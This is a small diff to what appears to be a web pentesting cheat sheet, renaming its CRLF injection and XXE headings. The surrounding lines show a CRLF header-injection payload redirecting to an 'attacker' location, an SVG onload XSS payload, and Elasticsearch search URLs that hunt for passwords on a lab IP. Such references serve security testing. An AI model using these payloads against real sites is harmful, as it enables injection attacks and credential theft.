@@ -1137,10 +1137,10 @@ xhr.send(null);
 
 ## CRLF Injection
   
--> Redirect  
+-> Redirect via GET  
 `/%0d%0aLocation:attacker`  
 
--> XSS 
+-> XSS via GET  
 `/%0d%0a%0d%0a<svg onload="alert(1)">`
 
 ## Elasticsearch - API
@@ -1152,7 +1152,7 @@ http://10.10.57.49:9200/<indice>
 http://10.10.57.49:9200/_search?pretty=true&q=pass  
 ```
 
-## XXE
+## XML External Entity - XXE
 
 ### Methods:
 ```
